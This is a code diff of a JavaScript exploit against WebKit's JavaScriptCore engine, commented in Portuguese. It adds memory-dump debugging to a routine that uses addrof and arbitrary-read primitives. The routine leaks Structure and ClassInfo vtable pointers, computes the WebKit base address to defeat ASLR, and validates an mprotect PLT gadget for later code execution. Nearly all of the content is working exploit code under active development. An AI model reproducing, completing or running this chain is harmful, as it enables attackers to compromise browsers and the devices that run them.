@@ -51,7 +51,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
+                    const byte = await arbReadFn(address.add(i + j), 1); // Remover logFn daqui, arbRead/arbReadUniversal já têm seu próprio log
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -439,6 +439,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // Tentar novamente a leitura do ponteiro da Structure após a modificação dos metadados
         // structure_pointer_from_dummy_object_addr é o endereço do ponteiro para a Structure (dentro do JSCell)
         const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+
+        // --- Ponto de Depuração 1: Antes de ler o ponteiro da Structure ---
+        logFn(`[ASLR LEAK DEBUG] Dump de memória ANTES de ler o ponteiro da Structure do dummy_object.`, "debug");
+        await dumpMemory(dummy_object_addr, 0x60, logFn, arb_read, "Structure_PreRead_Dump");
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+
         const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8); // Valor do ponteiro para o objeto Structure
 
         logFn(`[ASLR LEAK] Endereço da Structure do dummy_object (vazado): ${structure_address_from_leak.toString(true)}`, "leak");
@@ -454,9 +461,23 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const class_info_address = structure_address_from_leak.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
         logFn(`[ASLR LEAK] Endereço da ClassInfo do dummy_object: ${class_info_address.toString(true)}`, "info");
 
+        // --- Ponto de Depuração 2: Antes de ler a Vtable da ClassInfo ---
+        logFn(`[ASLR LEAK DEBUG] Dump de memória ANTES de ler a Vtable da ClassInfo.`, "debug");
+        // Dumpar um pouco antes e depois do offset esperado da vtable dentro da ClassInfo
+        await dumpMemory(class_info_address.sub(0x10), 0x50, logFn, arb_read, "ClassInfo_PreVtableRead_Dump");
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+
         // Endereço da Vtable da ClassInfo = ClassInfo Address + JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET (0x8)
         const vtable_class_info_address_in_webkit = await arb_read(class_info_address.add(JSC_OFFSETS_PARAM.ClassInfo.M_CACHED_TYPE_INFO_OFFSET), 8);
         logFn(`[ASLR LEAK] Endereço da Vtable da ClassInfo do dummy_object (dentro do WebKit): ${vtable_class_info_address_in_webkit.toString(true)}`, "leak");
+
+        // --- Ponto de Depuração 3: Depois de ler a Vtable da ClassInfo ---
+        logFn(`[ASLR LEAK DEBUG] Dump de memória APÓS ler a Vtable da ClassInfo.`, "debug");
+        // Dumpar novamente a mesma região para ver se o valor lido corresponde ao que está na memória
+        await dumpMemory(class_info_address.sub(0x10), 0x50, logFn, arb_read, "ClassInfo_PostVtableRead_Dump");
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
 
         if (!isAdvancedInt64Object(vtable_class_info_address_in_webkit) || vtable_class_info_address_in_webkit.equals(AdvancedInt64.Zero) || (vtable_class_info_address_in_webkit.low() & 0xFFF) !== 0x000) {
             const errMsg = `Vtable da ClassInfo (${vtable_class_info_address_in_webkit.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
@@ -482,7 +503,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
         const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
         logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
-        const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);
+        const mprotect_first_bytes_check = await arb_read_universal_js_heap(mprotect_addr_check, 4, logFn); // Usar universal read
+        
+        // --- Ponto de Depuração 4: Dump de mprotect_plt_stub ---
+        logFn(`[ASLR LEAK DEBUG] Dump de memória do mprotect_plt_stub para validação.`, "debug");
+        await dumpMemory(mprotect_addr_check, 0x20, logFn, arb_read_universal_js_heap, "mprotect_plt_stub_Dump");
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
 
         if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
             logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
